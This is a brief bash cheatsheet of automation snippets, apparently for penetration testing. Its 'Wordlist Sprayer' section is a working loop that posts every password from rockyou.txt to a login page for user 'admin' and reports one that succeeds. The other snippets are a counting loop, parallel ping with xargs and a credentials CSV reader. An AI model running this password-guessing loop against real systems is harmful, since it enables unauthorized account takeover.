# 🔁 Bash Automation Cheatsheet

## Brute-force Loops
```bash
for i in $(seq 1 100); do echo "Testing $i"; done
```

## Wordlist Sprayer
```bash
while read pass; do
  curl -s -d "username=admin&password=$pass" http://target/login | grep -q "Welcome" && echo "Valid password: $pass"
done < rockyou.txt
```

## Parallel Execution with xargs
```bash
cat ips.txt | xargs -P10 -I{} ping -c 1 {}
```

## Using IFS (Internal Field Separator)
```bash
while IFS=, read -r user pass; do
  echo "Username: $user | Password: $pass"
done < creds.csv
```